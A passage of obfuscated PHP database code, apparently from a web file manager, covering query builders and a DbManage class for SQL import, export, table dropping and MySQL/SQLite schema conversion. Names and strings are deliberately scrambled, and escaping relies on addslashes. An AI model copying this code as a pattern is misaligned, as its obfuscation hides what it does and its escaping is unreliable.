$èšªÊô[$ÀÛ›…Ì[328]] : array())); } public function update($•®ÚŸ¤, $ŠşÄçÙ×) { $Œó ‘í =& $_SERVER[™»È’øè]; $this->model = $ŠşÄçÙ×[$Œó ‘í[324]]; $Õ“§Ï™• = $Œó ‘í[1071] . $this->parseTable($ŠşÄçÙ×[$Œó ‘í[322]]) . $this->parseSet($•®ÚŸ¤) . $this->parseWhere(!empty($ŠşÄçÙ×[$Œó ‘í[318]]) ? $ŠşÄçÙ×[$Œó ‘í[318]] : $Œó ‘í[12]) . $this->parseOrder(!empty($ŠşÄçÙ×[$Œó ‘í[408]]) ? $ŠşÄçÙ×[$Œó ‘í[408]] : $Œó ‘í[12]) . $this->parseLimit(!empty($ŠşÄçÙ×[$Œó ‘í[335]]) ? $ŠşÄçÙ×[$Œó ‘í[335]] : $Œó ‘í[12]) . $this->parseLock(isset($ŠşÄçÙ×[$Œó ‘í[869]]) ? $ŠşÄçÙ×[$Œó ‘í[869]] : !1) . $this->parseComment(!empty($ŠşÄçÙ×[$Œó ‘í[397]]) ? $ŠşÄçÙ×[$Œó ‘í[397]] : $Œó ‘í[12]); return $this->execute($Õ“§Ï™•, $this->parseBind(!empty($ŠşÄçÙ×[$Œó ‘í[328]]) ? $ŠşÄçÙ×[$Œó ‘í[328]] : array())); } public function delete($¦–ğ­¾¨ = array()) { $Öø÷»œ“ =& $_SERVER[™»È’øè]; $this->model = $¦–ğ­¾¨[$Öø÷»œ“[324]]; $ŒÑ¯ÆÚ• = $Öø÷»œ“[1072] . $this->parseTable($¦–ğ­¾¨[$Öø÷»œ“[322]]) . $this->parseWhere(!empty($¦–ğ­¾¨[$Öø÷»œ“[318]]) ? $¦–ğ­¾¨[$Öø÷»œ“[318]] : $Öø÷»œ“[12]) . $this->parseOrder(!empty($¦–ğ­¾¨[$Öø÷»œ“[408]]) ? $¦–ğ­¾¨[$Öø÷»œ“[408]] : $Öø÷»œ“[12]) . $this->parseLimit(!empty($¦–ğ­¾¨[$Öø÷»œ“[335]]) ? $¦–ğ­¾¨[$Öø÷»œ“[335]] : $Öø÷»œ“[12]) . $this->parseLock(isset($¦–ğ­¾¨[$Öø÷»œ“[869]]) ? $¦–ğ­¾¨[$Öø÷»œ“[869]] : !1) . $this->parseComment(!empty($¦–ğ­¾¨[$Öø÷»œ“[397]]) ? $¦–ğ­¾¨[$Öø÷»œ“[397]] : $Öø÷»œ“[12]); return $this->execute($ŒÑ¯ÆÚ•, $this->parseBind(!empty($¦–ğ­¾¨[$Öø÷»œ“[328]]) ? $¦–ğ­¾¨[$Öø÷»œ“[328]] : array())); } public function select($ÓøŞ±îÀ = array()) { $Ô¦÷ì¤› =& $_SERVER[™»È’øè]; $this->model = $ÓøŞ±îÀ[$Ô¦÷ì¤›[324]]; $óÎË…á¿ = $this->buildSelectSql($ÓøŞ±îÀ); $»ä…Ó°ô = isset($ÓøŞ±îÀ[$Ô¦÷ì¤›[392]]) ? $ÓøŞ±îÀ[$Ô¦÷ì¤›[392]] : !1; if ($»ä…Ó°ô) { $é¶çÃ¡Ç = is_string($»ä…Ó°ô[$Ô¦÷ì¤›[94]]) ? $»ä…Ó°ô[$Ô¦÷ì¤›[94]] : $Ô¦÷ì¤›[1073] . md5($óÎË…á¿); $³§ÏÒÛ¡ = think_cache($é¶çÃ¡Ç, $Ô¦÷ì¤›[12], $»ä…Ó°ô); if (!1 !== $³§ÏÒÛ¡) { return $³§ÏÒÛ¡; } } $È§µÆÔ¼ = $this->query($óÎË…á¿, $this->parseBind(!empty($ÓøŞ±îÀ[$Ô¦÷ì¤›[328]]) ? $ÓøŞ±îÀ[$Ô¦÷ì¤›[328]] : array())); if ($»ä…Ó°ô && !1 !== $È§µÆÔ¼) { think_cache($é¶çÃ¡Ç, $È§µÆÔ¼, $»ä…Ó°ô); } return $È§µÆÔ¼; } public function buildSelectSql($Ùöƒò¥× = array()) { $³§ÉöÃ =& $_SERVER[™»È’øè]; if (isset($Ùöƒò¥×[$³§ÉöÃ[396]])) { if (strpos($Ùöƒò¥×[$³§ÉöÃ[396]], $³§ÉöÃ[50])) { list($©ÇÇÎº, $²³Æõş½) = explode($³§ÉöÃ[50], $Ùöƒò¥×[$³§ÉöÃ[396]]); } else { $©ÇÇÎº = $Ùöƒò¥×[$³§ÉöÃ[396]]; } $©ÇÇÎº = $©ÇÇÎº ? $©ÇÇÎº : 1; $²³Æõş½ = isset($²³Æõş½) ? $²³Æõş½ : (is_numeric($Ùöƒò¥×[$³§ÉöÃ[335]]) ? $Ùöƒò¥×[$³§ÉöÃ[335]] : 20); $¼Ÿ»ì× = $²³Æõş½ * ((int) $©ÇÇÎº - 1); $Ùöƒò¥×[$³§ÉöÃ[335]] = $¼Ÿ»ì× . $³§ÉöÃ[50] . $²³Æõş½; } if (think_config($³§ÉöÃ[1074])) { $“¯œÀ‚æ = $³§ÉöÃ[1075] . md5(serialize($Ùöƒò¥×)); $óó®ÛåÅ = think_cache($“¯œÀ‚æ); if ($óó®ÛåÅ) { return $óó®ÛåÅ; } } $İ™ Öà‹ = $this->parseSql($this->selectSql, $Ùöƒò¥×); $İ™ Öà‹ .= $this->parseLock(isset($Ùöƒò¥×[$³§ÉöÃ[869]]) ? $Ùöƒò¥×[$³§ÉöÃ[869]] : !1); if (isset($“¯œÀ‚æ)) { think_cache($“¯œÀ‚æ, $İ™ Öà‹); } return $İ™ Öà‹; } public function parseSql($¬±İ£Â, $®“ ê¬’ = array()) { $ÜñÌğÇ™ =& $_SERVER[™»È’øè]; $¬±İ£Â = str_replace(array($ÜñÌğÇ™[1076], $ÜñÌğÇ™[1077], $ÜñÌğÇ™[1078], $ÜñÌğÇ™[1079], $ÜñÌğÇ™[1080], $ÜñÌğÇ™[1081], $ÜñÌğÇ™[1082], $ÜñÌğÇ™[1083], $ÜñÌğÇ™[1084], $ÜñÌğÇ™[1085], $ÜñÌğÇ™[1086]), array($this->parseTable("{$®“ ê¬’[$ÜñÌğÇ™[322]]}"), $this->parseDistinct(isset($®“ ê¬’[$ÜñÌğÇ™[1087]]) ? $®“ ê¬’[$ÜñÌğÇ™[1087]] : !1), $this->parseField(!empty($®“ ê¬’[$ÜñÌğÇ™[316]]) ? $®“ ê¬’[$ÜñÌğÇ™[316]] : $ÜñÌğÇ™[202]), $this->parseJoin(!empty($®“ ê¬’[$ÜñÌğÇ™[325]]) ? $®“ ê¬’[$ÜñÌğÇ™[325]] : $ÜñÌğÇ™[12]), $this->parseWhere(!empty($®“ ê¬’[$ÜñÌğÇ™[318]]) ? $®“ ê¬’[$ÜñÌğÇ™[318]] : $ÜñÌğÇ™[12]), $this->parseGroup(!empty($®“ ê¬’[$ÜñÌğÇ™[546]]) ? $®“ ê¬’[$ÜñÌğÇ™[546]] : $ÜñÌğÇ™[12]), $this->parseHaving(!empty($®“ ê¬’[$ÜñÌğÇ™[1088]]) ? $®“ ê¬’[$ÜñÌğÇ™[1088]] : $ÜñÌğÇ™[12]), $this->parseOrder(!empty($®“ ê¬’[$ÜñÌğÇ™[408]]) ? $®“ ê¬’[$ÜñÌğÇ™[408]] : $ÜñÌğÇ™[12]), $this->parseLimit(!empty($®“ ê¬’[$ÜñÌğÇ™[335]]) ? $®“ ê¬’[$ÜñÌğÇ™[335]] : $ÜñÌğÇ™[12]), $this->parseUnion(!empty($®“ ê¬’[$ÜñÌğÇ™[390]]) ? $®“ ê¬’[$ÜñÌğÇ™[390]] : $ÜñÌğÇ™[12]), $this->parseComment(!empty($®“ ê¬’[$ÜñÌğÇ™[397]]) ? $®“ ê¬’[$ÜñÌğÇ™[397]] : $ÜñÌğÇ™[12])), $¬±İ£Â); return $¬±İ£Â; } public function getLastSql($Ü÷‡ùèÀ = '') { return $Ü÷‡ùèÀ ? $this->modelSql[$Ü÷‡ùèÀ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($öÈùˆ¼) { return addslashes($öÈùˆ¼); } public function setModel($ä€ÄÛö¡) { $this->model = $ä€ÄÛö¡; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¼–êÍÓ = array()) { $ã¡â Áè =& $_SERVER[™»È’øè]; if (empty($¼–êÍÓ)) { $¼–êÍÓ = $GLOBALS[$ã¡â Áè[6]][$ã¡â Áè[21]]; } $this->database = $¼–êÍÓ; } public function model($™ü“ÆŞ = '') { return new ModelBase($™ü“ÆŞ, $_SERVER[™»È’øè][12], $this->database); } public function db($ßÎ·‘ÅÅ = false) { $Ôıº™‰ =& $_SERVER[™»È’øè]; $ó¤ñ‡—× = array_change_key_case($this->database); if ($this->dbType() == $Ôıº™‰[13] || !$ßÎ·‘ÅÅ) { return $this->model()->db(); } $şù±Û™ = $ó¤ñ‡—×[$Ôıº™‰[1002]]; $ó¤ñ‡—×[$Ôıº™‰[1002]] = $Ôıº™‰[12]; if ($ó¤ñ‡—×[$Ôıº™‰[997]] == $Ôıº™‰[994]) { $å¬‚—ªß = $ó¤ñ‡—×[$Ôıº™‰[1003]]; $ó¤ñ‡—×[$Ôıº™‰[1003]] = substr($å¬‚—ªß, 0, strrpos($å¬‚—ªß, $Ôıº™‰[1089])); } $this->database = $ó¤ñ‡—×; $ä’—‹®½ = $this->model()->db(); try { $ŒæÄíãÊ = $ä’—‹®½->execute("\163\x68\157\x77\40\x64\x61\x74\x61\142\x61\163\x65\x73\40\154\x69\x6b\x65\40\x27{$şù±Û™}\x27"); } catch (Exception $±Ô²ƒÂè) { } if (!$ŒæÄíãÊ) { $ä’—‹®½->execute("\x63\162\x65\141\164\145\40\x64\x61\x74\x61\x62\x61\163\145\40\140{$şù±Û™}\140"); } $ó¤ñ‡—×[$Ôıº™‰[1002]] = $şù±Û™; if ($ó¤ñ‡—×[$Ôıº™‰[997]] == $Ôıº™‰[994]) { $ó¤ñ‡—×[$Ôıº™‰[1003]] .= $Ôıº™‰[1089] . $şù±Û™; } $this->database = $ó¤ñ‡—×; $ä’—‹®½->execute("\x75\163\x65\x20\140{$şù±Û™}\140"); return $ä’—‹®½; } public function createTable($Ãõ©ó Ë, &$ùŞüËÓã) { $æÜµÁò‡ =& $_SERVER[™»È’øè]; if (!IO::exist($Ãõ©ó Ë)) { ActionCall($æÜµÁò‡[1090], !0, 0); show_json(LNG($æÜµÁò‡[1091]), !1); } $¨ÂÜ»œ = $this->model()->db(); $£×¶ğëß = sqlSplit(IO::getContent($Ãõ©ó Ë)); foreach ($£×¶ğëß as $íó¢ä›¼) { $¸úíÈèä = stripos($íó¢ä›¼, $æÜµÁò‡[1092]) === 0; if ($¸úíÈèä) { $ùŞüËÓã->task[$æÜµÁò‡[811]] += 1; } $¨ÂÜ»œ->execute($íó¢ä›¼); if ($¸úíÈèä) { preg_match($æÜµÁò‡[1093], $íó¢ä›¼, $´¸æš’ñ); $ùŞüËÓã->task[$æÜµÁò‡[1094]] = $´¸æš’ñ[1]; $ùŞüËÓã->update(1); } } } public function insertTable($·êÓ™ÕÄ, &$äÉ“…) { $Ç¼˜¼ ¸ =& $_SERVER[™»È’øè]; $æÀ§Ø­ = $this->model()->db(); $³Ø‚­Í = $³ïÙª²° ? array($³ïÙª²°) : $æÀ§Ø­->getTables(); foreach ($·êÓ™ÕÄ as $µ¬’¬¾ı) { $³ïÙª²° = basename($µ¬’¬¾ı, $Ç¼˜¼ ¸[813]); if (!in_array($³ïÙª²°, $³Ø‚­Í)) { continue; } $äÉ“…->task[$Ç¼˜¼ ¸[1094]] = $³ïÙª²°; if (get_filesize($µ¬’¬¾ı) == 0) { continue; } $è×Ñ‰üâ = $this->sqlToDb($µ¬’¬¾ı, $äÉ“…); if (!$è×Ñ‰üâ) { ActionCall($Ç¼˜¼ ¸[1090], !0, 0); show_json(LNG($Ç¼˜¼ ¸[1095]) . "\133{$³ïÙª²°}\x5d", !1); } } } public function sqlFromDb($Öü”º¬, $‡·İÛŒÖ, &$÷ËÃ•ĞĞ, $¥®ñş“ = '') { if ($÷ËÃ•ĞĞ) { $÷ËÃ•ĞĞ->task[$_SERVER[™»È’øè][1094]] = $Öü”º¬; } $˜Éˆ¸±¢ = $this->model($Öü”º¬); $¯İ… °Ú = 0; $™“°íÕØ = 0; $à…Î°ò• = 10000; $¬úòÍãæ = fopen($‡·İÛŒÖ, $_SERVER[™»È’øè][1096]); $çõ³Å¼ = $˜Éˆ¸±¢->getPk(); $ú¬á×» = $˜Éˆ¸±¢->getDbFields(); $‚¾÷é–† = $_SERVER[™»È’øè][12]; if ($GLOBALS[$_SERVER[™»È’øè][812]] && in_array($Öü”º¬, array($_SERVER[™»È’øè][1097], $_SERVER[™»È’øè][1098]))) { $‚¾÷é–† = $Öü”º¬; } do { $ÄúØà¬‹ = array($çõ³Å¼ => array($_SERVER[™»È’øè][1044], $™“°íÕØ)); $°³°‡½¬ = $˜Éˆ¸±¢->where($ÄúØà¬‹)->field($ú¬á×»)->order($çõ³Å¼ . $_SERVER[™»È’øè][1099])->limit($à…Î°ò•)->select(); $°³°‡½¬ = !empty($°³°‡½¬) ? $°³°‡½¬ : array(); if (!($ö±¹š¬§ = count($°³°‡½¬))) { break; } $˜œé»½í = end($°³°‡½¬); $™“°íÕØ = $˜œé»½í[$çõ³Å¼]; $á¢£ ä‰ = array(); foreach ($°³°‡½¬ as $€¬™´‘“) { if ($‚¾÷é–†) { if ($Öü”º¬ == $_SERVER[™»È’øè][1097]) { if ($€¬™´‘“[$_SERVER[™»È’øè][33]] == $_SERVER[™»È’øè][1100]) { $“¹Û‡Â = json_decode($€¬™´‘“[$_SERVER[™»È’øè][417]], !0); if ($“¹Û‡Â[$_SERVER[™»È’øè][32]] == $GLOBALS[$_SERVER[™»È’øè][812]] && $“¹Û‡Â[$_SERVER[™»È’øè][775]] != 1) { continue; } } } else { if ($€¬™´‘“[$_SERVER[™»È’øè][33]] == $_SERVER[™»È’øè][1101] && $€¬™´‘“[$_SERVER[™»È’øè][94]] == $_SERVER[™»È’øè][804]) { continue; } } } if ($¥®ñş“) { $€¬™´‘“[$_SERVER[™»È’øè][84]] = "\173\151\157\x3a{$¥®ñş“}\x7d" . substr($€¬™´‘“[$_SERVER[™»È’øè][84]], strlen("\173\151\x6f\72{$€¬™´‘“[$_SERVER[™»È’øè][842]]}\175")); $€¬™´‘“[$_SERVER[™»È’øè][842]] = $¥®ñş“; } $á¢£ ä‰[] = $_SERVER[™»È’øè][1102] . $this->sqlEncode($€¬™´‘“) . $_SERVER[™»È’øè][1103]; } $ÜÖØš§¤ = "\x49\x4e\x53\x45\x52\x54\x20\x49\x4e\124\x4f\x20\x60{$Öü”º¬}\140\40\x28\x60" . implode($_SERVER[™»È’øè][1104], $ú¬á×») . $_SERVER[™»È’øè][1105]; fwrite($¬úòÍãæ, $ÜÖØš§¤ . implode($_SERVER[™»È’øè][1106], $á¢£ ä‰) . $_SERVER[™»È’øè][71] . PHP_EOL); $¯İ… °Ú += $ö±¹š¬§; if ($÷ËÃ•ĞĞ) { $÷ËÃ•ĞĞ->update($ö±¹š¬§); } } while ($à…Î°ò• == $ö±¹š¬§); fclose($¬úòÍãæ); return $¯İ… °Ú; } public function sqlToDb($‹Ëœ¦Ïğ, &$Ú’Åìó ) { $ÓšÂ»¦ =& $_SERVER[™»È’øè]; $úŸó·¡Ğ = $this->model()->db(); $ğ‰»½è“ = @fopen($‹Ëœ¦Ïğ, $ÓšÂ»¦[1107]); if (!$ğ‰»½è“) { return !1; } $÷‰ĞÎğ = 0; $ÙİÓÀİ = $ÓšÂ»¦[12]; $•ì¢Èõ˜ = array(); $Ü€Åäè¯ = $this->dbType(); $á¡”È÷˜ = $Ü€Åäè¯ == $ÓšÂ»¦[13] ? 500 : 2000; $¨Ù„Ëƒ¤ = basename($‹Ëœ¦Ïğ, $ÓšÂ»¦[813]); $Ñ¾ÍßÄ© = 0; $ÒëŒ¯ÜÍ = 4194304 - 104858; $Ôıç»… = 1000000 - 104858; while (!feof($ğ‰»½è“)) { $ƒõû¸×— = trim(fgets($ğ‰»½è“)); if (!$ƒõû¸×—) { continue; } $ëè·¹¶è = $this->sqlDecode($ƒõû¸×—, $Ü€Åäè¯, $¨Ù„Ëƒ¤); if (stripos($ëè·¹¶è, $ÓšÂ»¦[398]) === 0) { if (!$ÙİÓÀİ) { $ÙİÓÀİ = $ëè·¹¶è . $ÓšÂ»¦[53]; } continue; } if ($Ú’Åìó ) { $Ú’Åìó ->task[$ÓšÂ»¦[811]] += 1; } $÷‰ĞÎğ++; $•ì¢Èõ˜[] = rtrim(rtrim(trim($ëè·¹¶è), $ÓšÂ»¦[50]), $ÓšÂ»¦[71]); $ÑÁÚõÀ = null; $£î®ò•— = strlen($ëè·¹¶è); $Ñ¾ÍßÄ© += $£î®ò•—; if ($Ñ¾ÍßÄ© >= ($á¡”È÷˜ == 500 ? $Ôıç»… : $ÒëŒ¯ÜÍ)) { $ÑÁÚõÀ = array_pop($•ì¢Èõ˜); if ($÷‰ĞÎğ > 1) { $÷‰ĞÎğ--; } } if ($÷‰ĞÎğ >= $á¡”È÷˜ || $ÑÁÚõÀ) { $ëè·¹¶è = $ÙİÓÀİ . implode($ÓšÂ»¦[50], $•ì¢Èõ˜); if (!$úŸó·¡Ğ->execute($ëè·¹¶è)) { return !1; } if ($Ú’Åìó ) { $Ú’Åìó ->update($÷‰ĞÎğ); } $•ì¢Èõ˜ = array(); $÷‰ĞÎğ = 0; $Ñ¾ÍßÄ© = 0; if ($ÑÁÚõÀ) { $•ì¢Èõ˜ = array($ÑÁÚõÀ); $÷‰ĞÎğ = 1; $Ñ¾ÍßÄ© = $£î®ò•—; } } } fclose($ğ‰»½è“); if (!empty($•ì¢Èõ˜)) { $ëè·¹¶è = $ÙİÓÀİ . implode($ÓšÂ»¦[50], $•ì¢Èõ˜); if (!$úŸó·¡Ğ->execute($ëè·¹¶è)) { return !1; } if ($Ú’Åìó ) { $Ú’Åìó ->update($÷‰ĞÎğ); } } return !0; } public function dropTable($Ñ˜Âæ‚õ = null) { $ßƒÂÁ†  = $this->model()->db(); $š¹¸è»ñ = $Ñ˜Âæ‚õ ? array($Ñ˜Âæ‚õ) : $ßƒÂÁ† ->getTables(); if (!$š¹¸è»ñ) { return; } foreach ($š¹¸è»ñ as $Ñ˜Âæ‚õ) { if ($Ñ˜Âæ‚õ) { $Ñ˜Âæ‚õ = strtolower($Ñ˜Âæ‚õ); } else { continue; } $ßƒÂÁ† ->execute("\x64\x72\157\x70\40\x74\141\x62\154\145\40\x69\146\x20\145\170\x69\x73\164\163\40\140{$Ñ˜Âæ‚õ}\140"); } } private function sqlEncode($Ä³Ëâ¦Â) { $İí×ÎÒ— =& $_SERVER[™»È’øè]; $Ù®®Ô—‘ = array(); foreach ($Ä³Ëâ¦Â as $ª¨ˆ÷ô¤) { if (is_array($ª¨ˆ÷ô¤)) { $ª¨ˆ÷ô¤ = json_encode_force($ª¨ˆ÷ô¤); } $ª¨ˆ÷ô¤ = addslashes($ª¨ˆ÷ô¤); $ª¨ˆ÷ô¤ = str_replace(array($İí×ÎÒ—[1108], $İí×ÎÒ—[245]), array($İí×ÎÒ—[1109], $İí×ÎÒ—[1110]), $ª¨ˆ÷ô¤); $Ù®®Ô—‘[] = str_replace($İí×ÎÒ—[58], $İí×ÎÒ—[1111], $ª¨ˆ÷ô¤); } return $İí×ÎÒ—[58] . implode($İí×ÎÒ—[1112], $Ù®®Ô—‘) . $İí×ÎÒ—[58]; } private function sqlDecode($¶–¼´…Ñ, $»Ÿ´™ßÎ, $°­·šÕİ = '') { $¥ª‹‹ÉÌ =& $_SERVER[™»È’øè]; $¶–¼´…Ñ = str_replace(array($¥ª‹‹ÉÌ[1109], $¥ª‹‹ÉÌ[1110]), array($¥ª‹‹ÉÌ[1108], $¥ª‹‹ÉÌ[245]), $¶–¼´…Ñ); if ($»Ÿ´™ßÎ == $¥ª‹‹ÉÌ[13]) { return $°­·šÕİ != $¥ª‹‹ÉÌ[1113] ? stripslashes($¶–¼´…Ñ) : $¶–¼´…Ñ; } if ($°­·šÕİ == $¥ª‹‹ÉÌ[1113]) { $¶–¼´…Ñ = str_replace($¥ª‹‹ÉÌ[1114], $¥ª‹‹ÉÌ[118], stripslashes($¶–¼´…Ñ)); } return $¶–¼´…Ñ; } public function getSqlFile($¨Ó…—…² = '') { $¦­¿É»ó =& $_SERVER[™»È’øè]; $Äöà÷çÊ = $this->dbType(!0); $¹óîÍôŠ = CONTROLLER_DIR . "\151\156\x73\x74\x61\x6c\x6c\57\x64\x61\164\141\57{$Äöà÷çÊ}\x2e\163\x71\154"; $‚“âÜ˜» = file_get_contents($¹óîÍôŠ); $…ëø•Ğ = $¦­¿É»ó[1115] . ($Äöà÷çÊ == $¦­¿É»ó[829] ? $¦­¿É»ó[1116] : $¦­¿É»ó[1117]) . $¦­¿É»ó[1118]; preg_match_all($…ëø•Ğ, $‚“âÜ˜», $É›°éê«); $¯ÈÄË´ş = $É›°éê«[1]; $–Ãş¯Õ = $this->model()->db(); $Şï­Ìõö = $–Ãş¯Õ->getTables(); $¤Ûü£€€ = TEMP_FILES . $¦­¿É»ó[1119] . date($¦­¿É»ó[254]) . $¦­¿É»ó[8]; del_dir($¤Ûü£€€); mk_dir($¤Ûü£€€); $‡ö°²ì¿ = $¤Ûü£€€ . $¦­¿É»ó[1120]; $½“ë™Î€ = $¤Ûü£€€ . $¦­¿É»ó[1121]; $ûÊõ®Ø¤ = $Äöà÷çÊ == $¦­¿É»ó[13] ? $¦­¿É»ó[829] : $¦­¿É»ó[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\x6c\x2f\144\x61\x74\141\x2f{$ûÊõ®Ø¤}\x2e\163\161\154", $¤Ûü£€€); @touch($¤Ûü£€€ . $Äöà÷çÊ . $¦­¿É»ó[813]); $¦¯âÂ—ï = fopen($‡ö°²ì¿, $¦­¿É»ó[1096]); $‰£ş„Ä‚ = fopen($½“ë™Î€, $¦­¿É»ó[1096]); if ($Äöà÷çÊ == $¦­¿É»ó[13]) { $Şï­Ìõö = array_diff($Şï­Ìõö, array($¦­¿É»ó[809], $¦­¿É»ó[810])); $Ñó‚ºÀõ = array($¦­¿É»ó[1122], $¦­¿É»ó[1123], $¦­¿É»ó[1124]); fwrite($‰£ş„Ä‚, implode(PHP_EOL, $Ñó‚ºÀõ) . PHP_EOL . PHP_EOL); foreach ($Şï­Ìõö as $ó€ÈÃñ¢) { $ÕÛ¾¾ç× = $this->sqlFromSqlite($ó€ÈÃñ¢); if (!$ÕÛ¾¾ç×[$¦­¿É»ó[13]]) { continue; } fwrite($‰£ş„Ä‚, $ÕÛ¾¾ç×[$¦­¿É»ó[13]] . PHP_EOL . PHP_EOL); if (!in_array($ó€ÈÃñ¢, $¯ÈÄË´ş)) { fwrite($¦¯âÂ—ï, $ÕÛ¾¾ç×[$¦­¿É»ó[829]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Şï­Ìõö as $ó€ÈÃñ¢) { $ÕÛ¾¾ç× = $this->sqlFromMysql($ó€ÈÃñ¢); if (!$ÕÛ¾¾ç×[$¦­¿É»ó[829]]) { continue; } fwrite($¦¯âÂ—ï, $ÕÛ¾¾ç×[$¦­¿É»ó[829]] . PHP_EOL . PHP_EOL); if (!in_array($ó€ÈÃñ¢, $¯ÈÄË´ş)) { fwrite($‰£ş„Ä‚, $ÕÛ¾¾ç×[$¦­¿É»ó[13]] . PHP_EOL . PHP_EOL); } } } fclose($¦¯âÂ—ï); fclose($‰£ş„Ä‚); $‚“âÜ˜» = array($¦­¿É»ó[829] => $‡ö°²ì¿, $¦­¿É»ó[13] => $½“ë™Î€); return $¨Ó…—…² ? $‚“âÜ˜»[$¨Ó…—…²] : $‚“âÜ˜»; } public function dbType($¾ÎÔŞô = false) { $ÛÛáˆ´ò =& $_SERVER[™»È’øè]; $ §©­›‚ = $¾ÎÔŞô ? $GLOBALS[$ÛÛáˆ´ò[6]][$ÛÛáˆ´ò[21]] : $this->database; $ §©­›‚ = array_change_key_case($ §©­›‚); $æ¨›Ë¯ç = $ §©­›‚[$ÛÛáˆ´ò[997]]; if ($æ¨›Ë¯ç == $ÛÛáˆ´ò[994]) { $Ö«“ÎñÉ = explode($ÛÛáˆ´ò[4], $ §©­›‚[$ÛÛáˆ´ò[1003]]); $æ¨›Ë¯ç = $Ö«“ÎñÉ[0]; } $´ğ•‚À· = array($ÛÛáˆ´ò[1125] => $ÛÛáˆ´ò[13], $ÛÛáˆ´ò[942] => $ÛÛáˆ´ò[829]); if (isset($´ğ•‚À·[$æ¨›Ë¯ç])) { $æ¨›Ë¯ç = $´ğ•‚À·[$æ¨›Ë¯ç]; } return $æ¨›Ë¯ç; } public function sqlFromMysql($ğ™¼¬ƒ½, $‚­îƒÓÕ = '') { $’ÎÇõ™ =& $_SERVER[™»È’øè]; $šî’É¼ = $this->model()->db(); $óØ€ò¸Ş = $šî’É¼->query($’ÎÇõ™[1126] . $ğ™¼¬ƒ½ . $’ÎÇõ™[428]); if (!$óØ€ò¸Ş || !$óØ€ò¸Ş[0]) { return !1; } $»ãºèÏï = _get($óØ€ò¸Ş[0], $’ÎÇõ™[1127], $’ÎÇõ™[12]); if (!$»ãºèÏï) { return !1; } $Ë¾âòâ = "\104\x52\117\x50\x20\x54\101\102\114\105\40\x49\106\40\105\130\111\123\124\123\40\x60{$ğ™¼¬ƒ½}\140\x3b" . PHP_EOL . $»ãºèÏï . $’ÎÇõ™[71]; if ($‚­îƒÓÕ && $‚­îƒÓÕ == $’ÎÇõ™[829]) { return $Ë¾âòâ; } $ã¦ö§ƒ§ = array_change_key_case($GLOBALS[$’ÎÇõ™[6]][$’ÎÇõ™[21]]); $£¦¦üïğ = $ã¦ö§ƒ§[$’ÎÇõ™[1002]]; $œñ©¸ş = $’ÎÇõ™[1128] . $£¦¦üïğ . $’ÎÇõ™[1129] . $ğ™¼¬ƒ½ . $’ÎÇõ™[58]; $‡Š½Åå• = $’ÎÇõ™[1130] . $ğ™¼¬ƒ½ . $’ÎÇõ™[930]; $Û­úÖı¦ = $šî’É¼->query($œñ©¸ş); if (empty($Û­úÖı¦)) { $çµŠÓ = array($’ÎÇõ™[829] => $’ÎÇõ™[12], $’ÎÇõ™[13] => $’ÎÇõ™[12]); return $‚­îƒÓÕ ? $çµŠÓ[$‚­îƒÓÕ] : $çµŠÓ; } $‚‰©–Âõ = $šî’É¼->query($‡Š½Åå•); $È€ƒ•Ä× = $’ÎÇõ™[12]; $“¡Æ„«ş = array(); foreach ($‚‰©–Âõ as $í³»ğİş) { if (!$È€ƒ•Ä× && $í³»ğİş[$’ÎÇõ™[1131]] == $’ÎÇõ™[1132]) { $È€ƒ•Ä× = $í³»ğİş[$’ÎÇõ™[1133]]; } if (isset($“¡Æ„«ş[$í³»ğİş[$’ÎÇõ™[1131]]])) { $“¡Æ„«ş[$í³»ğİş[$’ÎÇõ™[1131]]][$’ÎÇõ™[1134]][] = $í³»ğİş[$’ÎÇõ™[1133]]; continue; } $“¡Æ„«ş[$í³»ğİş[$’ÎÇõ™[1131]]] = array($’ÎÇõ™[1135] => $í³»ğİş[$’ÎÇõ™[1131]], $’ÎÇõ™[1134] => array($í³»ğİş[$’ÎÇõ™[1133]]), $’ÎÇõ™[1136] => $í³»ğİş[$’ÎÇõ™[1137]] == $’ÎÇõ™[88] ? 0 : 1); } $æ¸›Ïï³ = array(); foreach ($“¡Æ„«ş as $í³»ğİş) { $ü¿¢Òßú = $í³»ğİş[$’ÎÇõ™[1135]] == $’ÎÇõ™[1132]; $Ÿ×¥•Â = array($’ÎÇõ™[1138], $í³»ğİş[$’ÎÇõ™[1136]] == $’ÎÇõ™[88] && !$ü¿¢Òßú ? $’ÎÇõ™[1139] : $’ÎÇõ™[12], $’ÎÇõ™[1140], $’ÎÇõ™[1141] . $ğ™¼¬ƒ½ . $’ÎÇõ™[11] . ($ü¿¢Òßú ? $’ÎÇõ™[1142] : $í³»ğİş[$’ÎÇõ™[1135]]) . $’ÎÇõ™[118], $’ÎÇõ™[1143], $’ÎÇõ™[118] . $ğ™¼¬ƒ½ . $’ÎÇõ™[118], $’ÎÇõ™[1144] . implode($’ÎÇõ™[1145], $í³»ğİş[$’ÎÇõ™[1134]]) . $’ÎÇõ™[1146]); $æ¸›Ïï³[] = implode($’ÎÇõ™[53], $Ÿ×¥•Â) . $’ÎÇõ™[71]; } $×ôÚ…Ó = array(); $úÀŠïÒä = array($’ÎÇõ™[1147] => $’ÎÇõ™[1148], $’ÎÇõ™[1148] => $’ÎÇõ™[1148], $’ÎÇõ™[331] => $’ÎÇõ™[358], $’ÎÇõ™[330] => $’ÎÇõ™[358]); foreach ($Û­úÖı¦ as $í³»ğİş) { $Ÿ×¥•Â = array($’ÎÇõ™[118] . $í³»ğİş[$’ÎÇõ™[1149]] . $’ÎÇõ™[118], isset($úÀŠïÒä[$í³»ğİş[$’ÎÇõ™[1150]]]) ? $úÀŠïÒä[$í³»ğİş[$’ÎÇõ™[1150]]] : $í³»ğİş[$’ÎÇõ™[1151]], $í³»ğİş[$’ÎÇõ™[1152]] == $’ÎÇõ™[928] ? $’ÎÇõ™[1153] : $’ÎÇõ™[1154], $í³»ğİş[$’ÎÇõ™[1149]] == $È€ƒ•Ä× ? $’ÎÇõ™[1155] : $’ÎÇõ™[12], $í³»ğİş[$’ÎÇõ™[979]] ? strtoupper(str_replace($’ÎÇõ™[11], $’ÎÇõ™[12], $í³»ğİş[$’ÎÇõ™[979]])) : $’ÎÇõ™[12]); $×ôÚ…Ó[] = trim(implode($’ÎÇõ™[53], $Ÿ×¥•Â)); } $Ø¼ÈÈ…— = array($’ÎÇõ™[1156] . 